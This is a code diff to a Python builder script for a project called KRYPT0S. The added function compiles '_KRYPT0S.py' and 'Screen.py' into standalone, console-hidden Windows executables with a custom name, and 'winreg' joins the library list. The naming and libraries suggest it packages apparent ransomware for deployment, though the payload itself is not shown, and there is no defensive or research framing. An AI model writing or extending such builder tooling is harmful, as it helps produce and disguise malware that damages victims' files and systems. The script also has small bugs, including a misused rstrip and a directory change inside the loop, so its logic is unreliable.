@@ -34,5 +34,51 @@ def libraries_check_section(libraries):
 
     print("\nLIBRARY INSTALLATION COMPLETED")
 
-libraries = ["pycryptodome", "requests", "pywin32"]
+def payload_conversion():
+    names = ["_KRYPT0S.py", "Screen.py"]
+    
+    try:
+        os.mkdir("krytp0s output conversion")
+    except FileExistsError:
+        pass
+    except:
+        exit("Error when creating output file. Please create a file named 'krytp0s output conversion' manually in the same directory to bypass this problem.")
+    
+    try:
+        os.chdir("krytp0s output conversion")
+    except FileExistsError:
+        exit("Unable to find 'krytp0s output conversion' folder, ensure it has been created and is found in this directory before continuing.")
+    except Exception as err:
+        exit(f"An unknown system error occured when trying to traverse a path : {err}")
+    
+    file_name = "KRYPT0S" # Default name
+    file_name = input("Enter a custom name for the executable file of _KRYPT0S.py -> ")
+    if ".exe" in file_name: file_name = file_name.rstrip('.exe')
+        
+    for name in names:
+        if name == "Screen.py": file_name = "Screen"
+        command = [
+            "pyinstaller",
+            "--onefile",
+            "--name",
+            file_name,
+            "--noconsole",
+            f"../_KRYPT0S_f1les/{name}"
+        ]
+
+        print(f"[!] Processing the conversion of '{file_name}'. Please stand by, this may take some time.")
+        result = subprocess.run(command, capture_output=True, text=True, shell=True)
+    
+        if result.returncode == 0:
+            print(f"[+] File {name} has been converted to {file_name}.exe.")
+        else:
+            exit(f"[-] A fatal error occurred: {result.stderr}. Please try again later")
+            
+        os.chdir("..") # Traverse a directory back
+    
+    print("[*] Conversion Completed. Please check the 'krytp0s output conversion' folder to view the output")
+
+libraries = ["pycryptodome", "requests", "pywin32", "winreg"]
 libraries_check_section(libraries)
+
+payload_conversion()
